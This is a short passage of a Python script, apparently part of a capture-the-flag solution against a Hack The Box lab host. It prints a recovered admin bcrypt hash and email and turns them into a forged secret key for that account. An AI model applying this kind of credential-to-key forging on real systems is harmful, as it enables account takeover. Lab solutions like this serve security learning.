    secret_key = f"{b64[0:4]}-{b64[4:8]}-{b64[8:12]}-{b64[12:16]}"
    print(f"secret_key: {secret_key}")

# [+] Admin password: $2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhIQgG 🎉
# [+] Admin email: admin@pass2.htb 🎉
password = "$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhIQgG"
email = "admin@pass2.htb"
calculate_secret_key(password=password, email=email) # secret_key: 0NPd-748b-L2CD-MoR3 🎉
